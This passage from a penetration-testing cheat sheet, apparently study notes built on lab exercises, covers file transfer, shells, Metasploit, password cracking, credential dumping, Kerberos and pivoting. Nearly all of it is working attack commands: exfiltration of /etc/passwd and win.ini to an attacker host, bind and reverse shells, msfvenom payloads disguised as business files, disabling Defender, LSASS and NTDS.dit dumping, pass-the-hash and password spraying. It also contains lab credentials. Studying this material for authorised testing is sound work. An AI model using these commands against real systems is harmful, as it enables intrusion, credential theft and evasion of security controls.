python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
```

### Netcat file transfer patterns
Listener → file:
```bash
nc -l -p 8000 > SharpKatz.exe
ncat -l -p 8000 --recv-only > SharpKatz.exe
```

Send file:
```bash
nc -q 0 192.168.49.128 8000 < SharpKatz.exe
ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
```

Common “443” transfer patterns:
```bash
sudo nc -l -p 443 -q 0 < SharpKatz.exe
nc 192.168.49.128 443 > SharpKatz.exe
cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
```

### PowerShell Remoting copy
```powershell
$Session = New-PSSession -ComputerName DATABASE01
Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
```

### RDP drive mounting
```bash
rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
```

---

## 18. AES Encryption PowerShell Module (Invoke-AESEncryption)

> Included verbatim as reference. Save as `Invoke-AESEncryption.ps1` then import.

```powershell
#>
function Invoke-AESEncryption {
    [CmdletBinding()]
    [OutputType([string])]
    Param
    (
        [Parameter(Mandatory = $true)]
        [ValidateSet('Encrypt', 'Decrypt')]
        [String]$Mode,

        [Parameter(Mandatory = $true)]
        [String]$Key,

        [Parameter(Mandatory = $true, ParameterSetName = "CryptText")]
        [String]$Text,

        [Parameter(Mandatory = $true, ParameterSetName = "CryptFile")]
        [String]$Path
    )

    Begin {
        $shaManaged = New-Object System.Security.Cryptography.SHA256Managed
        $aesManaged = New-Object System.Security.Cryptography.AesManaged
        $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
        $aesManaged.BlockSize = 128
        $aesManaged.KeySize = 256
    }

    Process {
        $aesManaged.Key = $shaManaged.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Key))

        switch ($Mode) {
            'Encrypt' {
                if ($Text) {$plainBytes = [System.Text.Encoding]::UTF8.GetBytes($Text)}

                if ($Path) {
                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
                    if (!$File.FullName) {
                        Write-Error -Message "File not found!"
                        break
                    }
                    $plainBytes = [System.IO.File]::ReadAllBytes($File.FullName)
                    $outPath = $File.FullName + ".aes"
                }

                $encryptor = $aesManaged.CreateEncryptor()
                $encryptedBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)
                $encryptedBytes = $aesManaged.IV + $encryptedBytes
                $aesManaged.Dispose()

                if ($Text) {return [System.Convert]::ToBase64String($encryptedBytes)}

                if ($Path) {
                    [System.IO.File]::WriteAllBytes($outPath, $encryptedBytes)
                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime
                    return "File encrypted to $outPath"
                }
            }

            'Decrypt' {
                if ($Text) {$cipherBytes = [System.Convert]::FromBase64String($Text)}

                if ($Path) {
                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
                    if (!$File.FullName) {
                        Write-Error -Message "File not found!"
                        break
                    }
                    $cipherBytes = [System.IO.File]::ReadAllBytes($File.FullName)
                    $outPath = $File.FullName -replace ".aes"
                }

                $aesManaged.IV = $cipherBytes[0..15]
                $decryptor = $aesManaged.CreateDecryptor()
                $decryptedBytes = $decryptor.TransformFinalBlock($cipherBytes, 16, $cipherBytes.Length - 16)
                $aesManaged.Dispose()

                if ($Text) {return [System.Text.Encoding]::UTF8.GetString($decryptedBytes).Trim([char]0)}

                if ($Path) {
                    [System.IO.File]::WriteAllBytes($outPath, $decryptedBytes)
                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime
                    return "File decrypted to $outPath"
                }
            }
        }
    }

    End {
        $shaManaged.Dispose()
        $aesManaged.Dispose()
    }
}
```

Import + example:
```powershell
Import-Module .\Invoke-AESEncryption.ps1
Invoke-AESEncryption -Mode Encrypt -Key "p4ssw0rd" -Path .\scan-results.txt
```

OpenSSL AES (Linux):
```bash
openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc
openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd
```

---

## 19. Living Off the Land (LOL)

- Windows LOL: `https://lolbas-project.github.io/#`
- Linux LOL: `https://gtfobins.github.io/`

### Basic Enumeration Commands
| Command | Result |
|---|---|
| `hostname` | Prints the PC's Name |
| `[System.Environment]::OSVersion.Version`	| Prints out the OS version and revision level |
| `wmic qfe get Caption,Description,HotFixID,InstalledOn` |	Prints the patches and hotfixes applied to the host |
| `ipconfig /all`	| Prints out network adapter state and configurations |
| `set` |	Displays a list of environment variables for the current session (ran from CMD-prompt) |
| `echo %USERDOMAIN%`	| Displays the domain name to which the host belongs (ran from CMD-prompt) |
| `echo %logonserver% `| Prints out the name of the Domain controller the host checks in with (ran from CMD-prompt) |
| systeminfo | Prints a summary of the host's information |

### PowerShell Commands
| Cmd-Let	| Description |
|---|---|
| `Get-Module` |	Lists available modules loaded for use.
| `Get-ExecutionPolicy -List`	| Will print the execution policy settings for each scope on a host. |
| `Set-ExecutionPolicy Bypass -Scope Process`	| This will change the policy for our current process using the -Scope parameter. Doing so will revert the policy once we vacate the process or terminate it. This is ideal because we won't be making a permanent change to the victim host. |
| `Get-ChildItem Env:` | ft Key,Value	Return environment values such as key paths, users, computer information, etc. |
| `Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt` |	With this string, we can get the specified user's PowerShell history. This can be quite helpful as the command history may contain passwords or point us towards configuration files or scripts that contain passwords. |
|` powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>"`	| This is a quick and easy way to download a file from the web using PowerShell and call it from memory. |

### Checking Defenses
Firewall Checks (Powershell)
```bash
netsh advfirewall show allprofiles
```

Windows Defender Check (Cmd)
```bat
sc query windefend
```

Check Status and Configuration settings (PowerShell)
```bash
Get-MpComputerStatus
```

Check if anyone else is logged onto the host (PowerShell)
```bash
qwinsta
```

### Network Information

| Networking Commands	| Description |
|---|---|
| `arp -a` |	Lists all known hosts stored in the arp table. |
| `ipconfig /all` |	Prints out adapter settings for the host. We can figure out the network segment from here. |
| `route print` |	Displays the routing table (IPv4 & IPv6) identifying known networks and layer three routes shared with the host. |
| `netsh advfirewall show allprofiles` |	Displays the status of the host's firewall. We can determine if it is active and filtering traffic. |


### Windows Management Instrumentation (WMI)
Quick WMI checks
| Command |	Description |
|---|---|
| `wmic qfe get Caption,Description,HotFixID,InstalledOn` |	Prints the patch level and description of the Hotfixes applied |
| `wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List` | Displays basic host information to include any attributes within the list |
| `wmic process list /format:list` | A listing of all processes on host |
| `wmic ntdomain list /format:list` |	Displays information about the Domain and Domain Controllers |
| `wmic useraccount list /format:list` | Displays information about all local accounts and any domain accounts that have logged into the device |
| `wmic group list /format:list` | Information about all local groups |
| `wmic sysaccount list /format:list` | Dumps information about any system accounts that are being used as service accounts. |
| `wmic ntdomain get Caption,Description,DnsForestName,DomainName,DomainControllerAddress` | Displays information about the domain and the child domain, and the external forest that our current domain has a trust with. |


### Net Commands
| Command |	Description |
|---|---|
| `net accounts` |Information about password requirements |
| `net accounts /domain` | Password and lockout policy |
| `net group /domain` |	Information about domain groups |
| `net group "Domain Admins" /domain` |	List users with domain admin privileges |
| `net group "domain computers" /domain` | List of PCs connected to the domain |
| `net group "Domain Controllers" /domain` | List PC accounts of domains controllers |
| `net group <domain_group_name> /domain` |	User that belongs to the group |
| `net groups /domain` | List of domain groups |
| `net localgroup` | All available groups |
| `net localgroup administrators /domain`	| List users that belong to the administrators group inside the domain (the group Domain Admins is included here by default) |
| `net localgroup Administrators`	| Information about a group (admins) |
| `net localgroup administrators [username] /add`	| Add user to administrators |
| `net share`	| Check current shares |
| `net user <ACCOUNT_NAME> /domain`	| Get information about a user within the domain |
| `net user /domain` | List all users of the domain |
| `net user %username%`	| Information about the current user |
| `net use x: \computer\share`	| Mount the share locally |
| `net view`	| Get a list of computers |
| `net view /all /domain[:domainname]`	| Shares on the domains |
| `net view \computer /ALL` | List shares of a computer |
| `net view /domain` | List of PCs of the domain |
- Can try use `net1` instead of `net`, to potentially avoid detections.

### Dsquery

User Search (PowerShell)
```bash
dsquery user
```

Computer Search (PowerShell)
```bash
dsquery computer
```

Wildcard Search (PowerShell)
```bash
dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
```

Users With Specific Attributes Set (PASSWD_NOTREQD)
```bash
dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl
```

Searching for Domain Controllers (PowerShell)
```bash
dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName
```

UAC (user Account Control) Bit Values:
| Value | UAC Attribute |
|---|---|
| `1` | Login Sript Will Execute |
| `2` | Account Is Disabled |
| `32` | Password Not Required |
| `64` | Password Can't Change |
| `128` | Encrypted Text Password Allowed |
| `512` | Normal User Account |
| `2048` | Interdomain Trust Account |
| `4096` | Domain Workstation or Member Server |
| `8192` | Domain Controller |
| `65536` | Password Does Not Expire |
| `524288` | Trusted For Impersonation |
| `1048576` | Account May Not Be Impersonated |

OID match strings: 

1. `1.2.840.113556.1.4.803`: The bit value must match completely to meet the search requirements.

2. `1.2.840.113556.1.4.804`: Want the results to show any attribute match if any bit in the chain matches. 

3. `1.2.840.113556.1.4.1941`: Used to match filters that apply to the Distinguished Name of an object and will search through all ownership and membership entries.

Logical Operators:
-  `&`: AND
- `!`: NOT
- `|`: OR
- Example: `(&(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=64))` → This would search for any user object that does NOT have the Password Can't Change attribute set.
- Example: `dsquery * -filter "(&(objectCategory=user)(adminCount=1)(description=*)(userAccountControl:1.2.840.113556.1.4.803:=2))" -limit 5 -attr sAMAccountName description` → Displays description field of a disabled account with administrative privileges
- Note: When Querying use Ldap-Display-Name for attributes

Active Directory Attributes: `https://learn.microsoft.com/en-us/windows/win32/adschema/attributes-all`

### certreq exfil trick (example)
```text
certreq.exe -Post -config http://192.168.49.128:8000/ c:\windows\win.ini
```

Listener:
```bash
sudo nc -lvnp 8000
```

### OpenSSL “server” download trick
Attacker:
```bash
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh
```

Target:
```bash
openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh
```

### Bitsadmin / BITS
```text
bitsadmin /transfer wcb /priority foreground http://10.10.15.66:8000/nc.exe C:\Users\htb-student\Desktop\nc.exe
```

```powershell
Import-Module bitstransfer
Start-BitsTransfer -Source "http://10.10.10.32:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe"
```

### Certutil download
```text
certutil.exe -verifyctl -split -f http://10.10.10.32:8000/nc.exe
```

---

## 20. User Agents (PowerShell)

List UAs:
```powershell
[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() |
 Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl
```

Use Chrome UA:
```powershell
$UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
```

---

## 21. Shells / Payloads / Interactivity

### Netcat listener
```bash
nc -lvnp 7777
```

### Bind shell (server-side)
```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
```

### Reverse shell (Windows PowerShell)
```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### Disable Defender realtime monitoring (example)
```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```

### Netcat/Bash reverse (Linux)
```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.12 7777 > /tmp/f
```

### msfvenom stageless payloads
```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > BonusCompensationPlanpdf.exe
```

### Spawn TTY / interactive shells
```bash
python -c 'import pty; pty.spawn("/bin/sh")'
/bin/sh -i
perl -e 'exec "/bin/sh";'
ruby -e 'exec "/bin/sh"'
lua -e "os.execute('/bin/sh')"
awk 'BEGIN {system("/bin/sh")}'
find . -exec /bin/sh \; -quit
```

### Tomcat WAR reverse shell (example)
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.129.204.126 LPORT=4444 -f war -o shell.war
```

---

## 22. Metasploit Basics

Paths:
```bash
ls /usr/share/metasploit-framework/modules
ls /usr/share/metasploit-framework/plugins/
ls /usr/share/metasploit-framework/scripts/
ls /usr/share/metasploit-framework/tools/
```

Install / launch:
```bash
sudo apt update && sudo apt install metasploit-framework
msfconsole
```

Module types:
- Auxiliary, Encoders, Exploits, NOPs, Payloads, Plugins, Post

Core commands (examples):
```text
search <term>
search <term> type:exploit
use 0
info
show options
set RHOSTS <target>
show targets
set target <index>
show payloads
set payload <index>
```

msfvenom examples:
```bash
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl -e x86/shikata_ga_nai
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -i 10 -o /root/Desktop/TeamViewerInstall.exe
```

DB setup (example):
```bash
sudo service postgresql status
sudo systemctl start postgresql
sudo msfdb init
sudo msfdb run
msfdb reinit
cp /usr/share/metasploit-framework/config/database.yml ~/.msf4/
sudo service postgresql restart
msfconsole -q
```

Workspaces / import:
```text
workspace
workspace -a Target_1
db_import Target.xml
hosts
services
db_nmap -sV -sS 10.10.10.8
db_export -h
creds -h
loot -h
```

Sessions / jobs:
```text
sessions
sessions -i 1
background
jobs -h
exploit -j
jobs -l
```

Meterpreter:
```text
hashdump
lsa_dump_sam
lsa_dump_secrets
```

Custom module load:
```bash
cp ~/Downloads/9861.rb /usr/share/metasploit-framework/modules/exploits/unix/webapp/nagios3_command_injection.rb
msfconsole -m /usr/share/metasploit-framework/modules/
msf6> loadpath /usr/share/metasploit-framework/modules/
msf6> reload_all
```

---

## 23. Password Cracking (John / Hashcat) + Wordlists

Quick hashes:
```bash
echo -n Soccer06! | md5sum
echo -n Soccer06! | sha256sum
```

Wordlists:
- rockyou: `https://github.com/brannondorsey/naive-hashcat/...`
- SecLists: `https://github.com/danielmiessler/SecLists`

John examples:
```bash
john --single passwd
john --wordlist=<wordlist_file> <hash_file>
john --incremental <hash_file>
hashid -j 193069ceb0461e1d40d216e32c79c704
```

Convert to john formats:
```text
<tool> <file_to_crack> > file.hash
```

Examples:
```bash
ssh2john.py SSH.private > ssh.hash
john --wordlist=rockyou.txt ssh.hash

office2john.py Protected.docx > protected-docx.hash
john --wordlist=rockyou.txt protected-docx.hash
john protected-docx.hash --show

zip2john ZIP.zip > zip.hash
```

Hashcat general syntax:
```text
hashcat -a <attack_mode> -m <hash_type> <hashes> <wordlist/rule/mask...>
```

Examples:
```bash
hashid -m '$1$FNr44XZC$wQxY6HHLrgrGX0e1195k.1'
hashcat -a 0 -m 0 e3e3ec5831ad5e7288241960e5d4fdb8 /usr/share/wordlists/rockyou.txt
hashcat -a 0 -m 0 1b0556a75770563578569ae21392630c /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

Mask example:
```bash
hashcat -a 3 -m 0 1e293d6912d074c0fd15844d803400dd '?u?l?l?l?l?d?s'
```

Mask charset symbols:
| Symbol | Charset |
|---|---|
| `?l` | lowercase |
| `?u` | uppercase |
| `?d` | digits |
| `?h` | hex lowercase |
| `?H` | hex uppercase |
| `?s` | special |
| `?a` | `?l?u?d?s` |
| `?b` | `0x00-0xff` |

Rule snippets:
| Rule | Meaning |
|---|---|
| `:` | no-op |
| `l` | lowercase |
| `u` | uppercase |
| `c` | capitalize |
| `sXY` | substitute X→Y |
| `$!` | append `!` |

Apply rules:
```bash
hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list
```

`d3ad0ne.rule` Is a good but intensive ruleset, applies mutations to wordlist → https://github.com/hashcat/hashcat/blob/master/rules/d3ad0ne.rule

CeWL:
```bash
cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist
wc -l inlane.wordlist
```

---

## 24. Credential Hunting / Files / Logs (Linux)

Find encrypted docs:
```bash
for ext in $(echo ".xls .xls* .xltx .od* .doc .doc* .pdf .pot .pot* .pp*"); do
  echo -e "\nFile extension: " $ext
  find / -name *$ext 2>/dev/null | grep -v "lib\|fonts\|share\|core"
done
```

Find SSH keys:
```bash
grep -rnE '^\-{5}BEGIN [A-Z0-9]+ PRIVATE KEY\-{5}$' /* 2>/dev/null
ssh-keygen -yf ~/.ssh/id_ed25519
```

Crack OpenSSL-encrypted tarball (example):
```bash
for i in $(cat rockyou.txt); do
  openssl enc -aes-256-cbc -d -in GZIP.gzip -k "$i" 2>/dev/null | tar xz
done
```

Bitlocker (example workflow):
```bash
bitlocker2john -i Backup.vhd > backup.hashes
hashcat -a 0 -m 22100 '<bitlocker_hash>' /usr/share/wordlists/rockyou.txt

sudo apt-get install dislocker
sudo mkdir -p /media/bitlocker /media/bitlockermount
sudo losetup -f -P Backup.vhd
sudo dislocker /dev/loop0p2 -u1234qwer -- /media/bitlocker
sudo mount -o loop /media/bitlocker/dislocker-file /media/bitlockermount
```

Config file hunting:
```bash
for l in $(echo ".conf .config .cnf"); do
  echo -e "\nFile extension: " $l
  find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core"
done

for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib"); do
  echo -e "\nFile: " $i
  grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#"
done
```

DB file hunting:
```bash
for l in $(echo ".sql .db .*db .db*"); do
  echo -e "\nDB File extension: " $l
  find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man"
done
```

Notes:
```bash
find /home/* -type f -name "*.txt" -o ! -name "*.*"
```

Script hunting:
```bash
for l in $(echo ".py .pyc .pl .go .jar .c .sh"); do
  echo -e "\nFile extension: " $l
  find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share"
done
```

Cron / history:
```bash
cat /etc/crontab
ls -la /etc/cron.*/
tail -n5 /home/*/.bash*
```

Logs (search patterns):
```bash
for i in $(ls /var/log/* 2>/dev/null); do
  GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null)
  if [[ $GREP ]]; then
    echo -e "\n#### Log file: " $i
    grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null
  fi
done
```

Tools:
- Mimipenguin: `https://github.com/huntergregal/mimipenguin`
- LaZagne: `https://github.com/AlessandroZ/LaZagne`
- firefox_decrypt: `https://github.com/unode/firefox_decrypt`
- PCredz: `https://github.com/lgandx/PCredz`

Firefox creds:
```bash
ls -l .mozilla/firefox/ | grep default
cat .mozilla/firefox/*.default-release/logins.json | jq .
python3.9 firefox_decrypt.py
```

---

## 25. Windows Creds / Hashes / Dumping

Windows registry hives:
| Hive | Description |
|---|---|
| `HKLM\SAM` | Local user password hashes |
| `HKLM\SYSTEM` | Boot key for SAM decryption |
| `HKLM\SECURITY` | LSA secrets (cached creds/DPAPI/etc.) |

Save hives:
```text
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save
```

Impacket secretsdump (local):
```bash
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```

Crack NT hashes:
```bash
sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
```

Crack DCC2:
```bash
hashcat -m 2100 '$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25' /usr/share/wordlists/rockyou.txt
```

Mimikatz basics:
```text
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
```

NetExec remote dumps:
```bash
netexec smb 10.129.42.198 --local-auth -u bob -p 'HTB_@cademy_stdnt!' --lsa
netexec smb 10.129.42.198 --local-auth -u bob -p 'HTB_@cademy_stdnt!' --sam
```

LSASS dump approaches:
- Task Manager → Processes → Local Security Authority Process → Create dump file (saves in `%temp%`)

Find PID:
```text
tasklist /svc
Get-Process lsass
```

Mimikatz Passwords from dump
```
mimikatz # sekurlsa::minidump C:\Users\user\AppData\Local\Temp\lsass.DMP

sekurlsa::LogonPasswords
```

Dump with comsvcs:
```text
rundll32 C:\windows\system32\comsvcs.dll, MiniDump <lsass_PID> C:\lsass.dmp full
```

Parse with pypykatz:
```text
pypykatz lsa minidump /home/peter/Documents/lsass.dmp
```

Vault / saved creds:
```text
rundll32 keymgr.dll,KRShowKeyMgr
cmdkey /list
runas /savecred /user:SRV01\mcharles cmd
```

---

## 26. Bruteforce / Spraying / Default Creds

NetExec install + usage:
```bash
sudo apt-get -y install netexec
netexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>
netexec winrm 10.129.42.197 -u user.list -p password.list
```

Evil-WinRM install:
```bash
sudo gem install evil-winrm
evil-winrm -i <target-IP> -u <username> -p <password>
```

Hydra examples:
```bash
hydra -L user.list -P password.list ssh://10.129.42.197
hydra -L user.list -P password.list rdp://10.129.42.197
hydra -L user.list -P password.list smb://10.129.42.197
hydra -C user_pass.list ssh://10.100.38.23
```

Metasploit SMB login:
```text
msf6 > use auxiliary/scanner/smb/smb_login
```

NetExec share enum:
```bash
netexec smb 10.129.42.197 -u "user" -p "password" --shares
smbclient -U user \\\\10.129.42.197\\SHARENAME
```

Password spraying:
```bash
netexec smb 10.100.38.0/24 -u <usernames.list> -p 'ChangeMe123!'

crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'
```

Default creds cheat-sheet tool:
```bash
pip3 install defaultcreds-cheat-sheet
creds search linksys
```

---

## 27. NTDS.dit Dumping (AD)

Create shadow:
```text
vssadmin CREATE SHADOW /For=C:
```

Copy NTDS.dit:
```text
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
```

Move to SMB share:
```text
cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.15.30\CompData
```

Extract hashes:
```bash
impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
```

NetExec module shortcut:
```bash
netexec smb 10.129.201.57 -u bwilliamson -p 'P@55w0rd!' -M ntdsutil
```

Pass-the-hash with evil-winrm:
```bash
evil-winrm -i 10.129.201.57 -u Administrator -H 64f12cddaa88057e06a81b54e73b949b
```

---

## 28. Kerberos Tickets / Keytabs / Pivot Notes

KeyTab / ccache discovery:
```bash
realm list
ps -ef | grep -i "winbind\|sssd"
find / -name *keytab* -ls 2>/dev/null
crontab -l
env | grep -i krb5
ls -la /tmp
```

Keytab usage:
```bash
klist -k -t /opt/specialfiles/carlos.keytab
kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab
smbclient //dc01/carlos -k -c ls
```

Extract keytab hashes:
```bash
python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab
```

Import ccache:
```bash
cp /tmp/krb5cc_* .
export KRB5CCNAME=/root/krb5cc_...
klist
smbclient //dc01/C$ -k -c ls -no-pass
```

Pivot checklist (chisel socks example):
1. Add hostnames/IPs to `/etc/hosts`
2. Configure proxychains (`socks5 127.0.0.1 1080`)
3. Download chisel + start server (reverse)
```bash
wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
gzip -d chisel_1.7.7_linux_amd64.gz
mv chisel_* chisel && chmod +x ./chisel
sudo ./chisel server --reverse
```
4. Run client on target (example)
```text
c:\tools\chisel.exe client 10.10.14.33:8080 R:socks
```
5. Use Kerberos tools via proxychains (example)
```bash
proxychains impacket-wmiexec dc01 -k
proxychains evil-winrm -i dc01 -r inlanefreight.htb
```

---

## 29. ADCS / PtC / Shadow Credentials (references)

> Commands preserved as provided for reference; validate paths, templates, and environment before use.

```bash
impacket-ntlmrelayx -t http://10.129.234.110/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication
python3 printerbug.py INLANEFREIGHT.LOCAL/wwhite:"package5shores_topher1"@10.129.234.109 10.10.16.12

git clone https://github.com/dirkjanm/PKINITtools.git && cd PKINITtools
python3 -m venv .venv
source .venv/bin/activate
pip3 install -r requirements.txt
python3 gettgtpkinit.py -cert-pfx ../krbrelayx/DC01$.pfx -dc-ip 10.129.234.109 'inlanefreight.local/dc01$' /tmp/dc.ccache

export KRB5CCNAME=/tmp/dc.ccache
impacket-secretsdump -k -no-pass -dc-ip 10.129.234.109 -just-dc-user Administrator 'INLANEFREIGHT.LOCAL/DC01$'@DC01.INLANEFREIGHT.LOCAL

pywhisker --dc-ip 10.129.234.109 -d INLANEFREIGHT.LOCAL -u wwhite -p 'package5shores_topher1' --target jpinkman --action add
python3 gettgtpkinit.py -cert-pfx ../eFUVVTPf.pfx -pfx-pass 'bmRH4LK7UwPrAOfvIx6W' -dc-ip 10.129.234.109 INLANEFREIGHT.LOCAL/jpinkman /tmp/jpinkman.ccache
export KRB5CCNAME=/tmp/jpinkman.ccache
evil-winrm -i dc01.inlanefreight.local -r inlanefreight.local
```
## 30. Crackmapexec Usage For Auth Attacks

Enumerating Logged in Users:
```bash
crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users
```

Extract Hashes from SAM Database
```bash
crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam
```
Pass-the-Hash (PtH)
```bash
crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE
```
---
## 31. Pivoting, Tunneling and Port Forwarding
## Port Forwarding With SSH

Forward Internal MySQL Service (Port 3306) to Attack Box (Port 1234) Through SSH
```bash
ssh -L 1234:localhost:3306 ubuntu@10.129.202.64

# Confirm Port Forwarding Worked
nmap -v -sV -p1234 localhost
```

Forwarding Multiple Ports (MySQL and Webserver)
```bash
ssh -L 1234:localhost:3306 -L 8080:localhost:80 ubuntu@10.129.202.64
```

### Pivoting with SOCKS

Enabling Dynamic Port Forwarding with SSH (Port 9050)
```bash
ssh -D 9050 ubuntu@10.129.202.64
```

Adding socks4 to ProxyCahins Config (Port 9050)
```bash
# Check if already configured
tail -4 /etc/proxychains.conf

# If not
echo 'socks4 	127.0.0.1 9050' >> /etc/proxychains.conf
```

Using Nmap with Proxychains to Probe Internal Devices
```bash
proxychains nmap -v -sn 172.16.5.1-200

proxychains nmap -v -Pn -sT 172.16.5.19
```

Using Metasploit with Proxychains
```bash
proxychains msfconsole
```

Using xfreerdp with Proxychains
```bash
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

### Pivoting With Meterpreter Shell

Scenario:
- Atack Host `10.10.15.5`
- Victim Server (DMZ) `10.129.15.50` `172.16.5.129`
- Victim Server (Compromised Internal Host) `172.16.5.19`

Exploit:
1. Set up port forwarding from attack host
    ```bash
    ssh -R 172.16.5.129:8080:0.0.0.0:8000 ubuntu@10.129.15.50 -vN
    ```

2. Generate Payload
    ```bash
    msfvenom -p windows/x64/meterpreter/reverse_https lhost= 172.16.5.129 -f exe -o backupscript.exe LPORT=8080
    ```

3. Set Up multi/andler
    ```bash
    msf6 > use exploit/multi/handler

    set lhost 0.0.0.0

    set lport 8000
    
    run
    ```

4. Transfer Payload to DMZ
    ```bash
    scp backupscript.exe ubuntu@10.129.15.50 :~/
    ```

5. Trnasfer Payload to Target Devices
   
   Set up Python Server on DMZ
   ```bash
   python3 -m http.server 8123
   ```

   Download Payload on Target
   ```bash
   Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"
   ```

6. Execute Payload on Target
    ```bash
    .\backupscript.exe
    ```

### Ping Sweep

Ping Sweep In Meterpreter
```bash
meterpreter > run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
```

Ping Sweep Linux Based
```bash
for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
```

Ping Sweep Windows Based (CMD)
```bat
for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
```

Ping Sweep Windows Based (Powershell)
```bash
